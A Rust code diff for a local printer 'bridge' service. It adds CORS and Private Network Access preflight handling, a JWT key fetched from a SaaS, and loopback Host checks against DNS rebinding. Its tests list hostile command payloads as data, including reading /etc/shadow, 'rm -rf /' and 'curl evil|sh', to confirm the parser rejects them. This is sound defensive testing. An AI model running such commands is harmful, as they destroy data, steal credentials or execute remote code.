@@ -16,8 +16,8 @@ use std::sync::Arc;
 
 use axum::extract::ws::{Message, WebSocket, WebSocketUpgrade};
 use axum::extract::State;
-use axum::http::{HeaderMap, Uri};
-use axum::response::IntoResponse;
+use axum::http::{header, HeaderMap, HeaderName, HeaderValue, StatusCode, Uri};
+use axum::response::{IntoResponse, Response};
 use axum::routing::get;
 use axum::{Json, Router};
 
@@ -58,13 +58,28 @@ async fn main() {
         .map(PathBuf::from)
         .unwrap_or_else(|_| PathBuf::from("devices.json"));
 
+    // Política de auth: `BRIDGE_TOKEN` + `BRIDGE_ALLOWED_ORIGINS` del entorno. La CLAVE PÚBLICA para
+    // verificar la credencial JWT firmada se PIDE AL SAAS (`BRIDGE_SAAS_URL` → `/api/v1/auth/public-key/`),
+    // que es su fuente de verdad y gestiona la rotación; `BRIDGE_JWT_PUBLIC_KEY` solo la override.
+    // Si el SaaS no responde, el Bridge degrada a la vía de token simétrico (no aborta el arranque).
+    let mut auth = BridgeAuth::from_env();
+    if !auth.has_jwt() {
+        if let Ok(saas_url) = std::env::var(auth::ENV_SAAS_URL) {
+            if !saas_url.trim().is_empty() {
+                let (aud, hub_id) = auth::expected_claims_from_env();
+                if let Some(v) = auth::jwt_verifier_from_saas(saas_url.trim(), aud, hub_id).await {
+                    auth = auth.with_jwt(v);
+                }
+            }
+        }
+    }
+
     let (events_tx, _) = broadcast::channel(EVENT_BUS_CAPACITY);
     let state = Arc::new(AppState {
         registry: DeviceRegistry::load(devices_path),
         queue: PrintQueue::new(RetryPolicy::default()),
         events: events_tx,
-        // Lee `BRIDGE_TOKEN` + `BRIDGE_ALLOWED_ORIGINS` del entorno (loggea un warn si falta el token).
-        auth: BridgeAuth::from_env(),
+        auth,
     });
 
     spawn_queue_worker(state.clone());
@@ -82,9 +97,49 @@ async fn main() {
 /// `main` para que los tests de integración ejerzan exactamente el mismo cableado.
 fn build_router(state: Arc<AppState>) -> Router {
     Router::new()
-        .route("/status", get(status))
-        .route("/ws", get(ws_upgrade))
+        .route("/status", get(status).options(preflight))
+        .route("/ws", get(ws_upgrade).options(preflight))
         .with_state(state)
+}
+
+/// Cabeceras CORS + **Private Network Access** para que un origen HTTPS público (la PWA del tenant,
+/// incl. su **dominio propio**) pueda alcanzar el Bridge en `localhost` en Chrome moderno. Refleja
+/// el `Origin`: el preflight solo autoriza el **intento**; la credencial (JWT firmado / token) sigue
+/// siendo la puerta real en el handshake de `/ws`. `/status` es de solo-lectura sin acción.
+fn cors_pna_headers(headers: &HeaderMap) -> Vec<(HeaderName, HeaderValue)> {
+    let origin = headers
+        .get(header::ORIGIN)
+        .and_then(|v| v.to_str().ok())
+        .unwrap_or("*");
+    let mut out = Vec::new();
+    if let Ok(v) = HeaderValue::from_str(origin) {
+        out.push((header::ACCESS_CONTROL_ALLOW_ORIGIN, v));
+    }
+    out.push((header::ACCESS_CONTROL_ALLOW_METHODS, HeaderValue::from_static("GET, OPTIONS")));
+    out.push((
+        header::ACCESS_CONTROL_ALLOW_HEADERS,
+        HeaderValue::from_static("authorization, x-hub-session, content-type"),
+    ));
+    // La opt-in de PNA: sin esto Chrome bloquea public-HTTPS → localhost.
+    out.push((
+        HeaderName::from_static("access-control-allow-private-network"),
+        HeaderValue::from_static("true"),
+    ));
+    out.push((header::ACCESS_CONTROL_MAX_AGE, HeaderValue::from_static("600")));
+    out
+}
+
+/// Preflight `OPTIONS` de `/status` y `/ws`: responde 204 con la opt-in de PNA. Sujeto a `Host`
+/// loopback (anti DNS-rebinding), igual que el resto de rutas.
+async fn preflight(State(state): State<Arc<AppState>>, headers: HeaderMap) -> Response {
+    if !state.auth.host_allowed(&headers) {
+        return (StatusCode::FORBIDDEN, "bad host").into_response();
+    }
+    let mut resp = Response::builder().status(StatusCode::NO_CONTENT);
+    for (k, v) in cors_pna_headers(&headers) {
+        resp = resp.header(k, v);
+    }
+    resp.body(axum::body::Body::empty()).unwrap_or_default().into_response()
 }
 
 /// Spawnea el worker de la cola de impresión (`PrintQueue::run`, reintentos según
@@ -140,14 +195,29 @@ fn spawn_watchdog(state: Arc<AppState>) {
 /// es lo único que consume `bridge-client.ts`. El resto de claves son informativas y pueden
 /// variar por plataforma (`service` identifica esta línea; `devices`/`watchdog` espejan los
 /// contadores que ya reporta la app Android).
-async fn status(State(state): State<Arc<AppState>>) -> impl IntoResponse {
-    Json(serde_json::json!({
+async fn status(State(state): State<Arc<AppState>>, headers: HeaderMap) -> Response {
+    // `Host` loopback también en `/status` (anti DNS-rebinding: cierra la fuga de existencia/versión).
+    if !state.auth.host_allowed(&headers) {
+        return (StatusCode::FORBIDDEN, "bad host").into_response();
+    }
+    let mut resp = Json(serde_json::json!({
         "ok": true,
         "version": VERSION,
         "service": "erplora-bridge",
         "devices": state.registry.get_all().len(),
         "watchdog": true,
     }))
+    .into_response();
+    // ACAO reflejado para que el `fetch` de detección cross-origin (PWA del tenant) pueda leer la
+    // respuesta. `/status` no expone datos sensibles ni ejecuta nada.
+    let origin = headers
+        .get(header::ORIGIN)
+        .and_then(|v| v.to_str().ok())
+        .unwrap_or("*");
+    if let Ok(v) = HeaderValue::from_str(origin) {
+        resp.headers_mut().insert(header::ACCESS_CONTROL_ALLOW_ORIGIN, v);
+    }
+    resp
 }
 
 /// `GET /ws` → upgrade a WebSocket, **gateado por auth** (ADR-0050 §seguridad).
@@ -507,5 +577,94 @@ mod integration_tests {
         let req = ws_upgrade_request(port, "/ws", &[("Origin", "http://localhost:5173")]);
         let status = send_request(port, &req).await;
         assert!(status.contains("101"), "sin token configurado el upgrade pasa con buen Origin, fue: {status:?}");
+    }
+
+    /// Como `send_request` pero devuelve la respuesta COMPLETA (status line + cabeceras) para poder
+    /// aserir sobre cabeceras (CORS/PNA). Lee hasta el fin de cabeceras (`\r\n\r\n`) o EOF.
+    async fn send_request_full(port: u16, request: &str) -> String {
+        let mut stream = TcpStream::connect(("127.0.0.1", port)).await.unwrap();
+        stream.write_all(request.as_bytes()).await.unwrap();
+        stream.flush().await.unwrap();
+        let mut buf = Vec::new();
+        let _ = tokio::time::timeout(Duration::from_secs(2), async {
+            let mut tmp = [0u8; 1024];
+            loop {
+                let n = stream.read(&mut tmp).await.unwrap_or(0);
+                if n == 0 {
+                    break;
+                }
+                buf.extend_from_slice(&tmp[..n]);
+                if buf.windows(4).any(|w| w == b"\r\n\r\n") {
+                    break;
+                }
+            }
+        })
+        .await;
+        String::from_utf8_lossy(&buf).to_string()
+    }
+
+    // ── C: el surface Hub→Bridge es un enum CERRADO (jamás FS/shell) ─────────
+    #[test]
+    fn command_surface_is_a_closed_enum_no_fs_or_shell() {
+        // Guard: ninguna acción de escritura de ficheros / shell / ruta arbitraria deserializa a
+        // `Command` (serde `tag="action"` sin variante `other`), así que el dispatcher la rechaza
+        // como `bad_command` en vez de ejecutar nada. Si alguien añadiera una capacidad peligrosa,
+        // este test la obliga a ser una decisión consciente (rompería aquí).
+        for dangerous in [
+            r#"{"action":"write_file","path":"/etc/passwd","data":"x"}"#,
+            r#"{"action":"read_file","path":"/etc/shadow"}"#,
+            r#"{"action":"exec","cmd":"rm -rf /"}"#,
+            r#"{"action":"shell","cmd":"curl evil|sh"}"#,
+            r#"{"action":"delete_file","path":"/x"}"#,
+        ] {
+            assert!(
+                serde_json::from_str::<Command>(dangerous).is_err(),
+                "acción peligrosa NO debe deserializar: {dangerous}"
+            );
+        }
+        // Sanity: una acción legítima de hardware SÍ deserializa.
+        assert!(serde_json::from_str::<Command>(r#"{"action":"discover_printers"}"#).is_ok());
+    }
+
+    // ── A (e2e): `Host` de rebinding rechazado en `/ws` y `/status` ──────────
+    #[tokio::test]
+    async fn ws_upgrade_rejected_with_rebinding_host() {
+        let port = spawn_server(BridgeAuth::new(Some("s3cr3t".into()), vec![])).await;
+        // Todo válido salvo el `Host`: un dominio atacante resuelto a 127.0.0.1 (DNS rebinding) → 403.
+        let req = "GET /ws HTTP/1.1\r\nHost: attacker.com\r\nOrigin: http://localhost:5173\r\n\
+             Authorization: Bearer s3cr3t\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\
+             Sec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\r\n";
+        let status = send_request(port, req).await;
+        assert!(status.contains("403"), "Host de rebinding debe ser 403, fue: {status:?}");
+    }
+
+    #[tokio::test]
+    async fn status_rejected_with_rebinding_host() {
+        let port = spawn_server(BridgeAuth::new(Some("s3cr3t".into()), vec![])).await;
+        let req = "GET /status HTTP/1.1\r\nHost: attacker.com\r\nConnection: close\r\n\r\n";
+        let status = send_request(port, req).await;
+        assert!(status.contains("403"), "/status con Host de rebinding debe ser 403, fue: {status:?}");
+    }
+
+    // ── B: el preflight PNA concede el acceso a red privada (dominio propio incluido) ──
+    #[tokio::test]
+    async fn preflight_grants_private_network_access() {
+        let port = spawn_server(BridgeAuth::new(Some("s3cr3t".into()), vec![])).await;
+        // Preflight desde el dominio propio del tenant (HTTPS público) → 204 + opt-in de PNA.
+        let req = format!(
+            "OPTIONS /ws HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nOrigin: https://erp.midominio.com\r\n\
+             Access-Control-Request-Private-Network: true\r\n\
+             Access-Control-Request-Method: GET\r\nConnection: close\r\n\r\n"
+        );
+        let resp = send_request_full(port, &req).await.to_ascii_lowercase();
+        assert!(resp.contains("204"), "preflight debe responder 204, fue: {resp:?}");
+        assert!(
+            resp.contains("access-control-allow-private-network: true"),
+            "preflight debe conceder PNA, fue: {resp:?}"
+        );
+        assert!(
+            resp.contains("access-control-allow-origin: https://erp.midominio.com"),
+            "preflight debe reflejar el Origin, fue: {resp:?}"
+        );
     }
 }
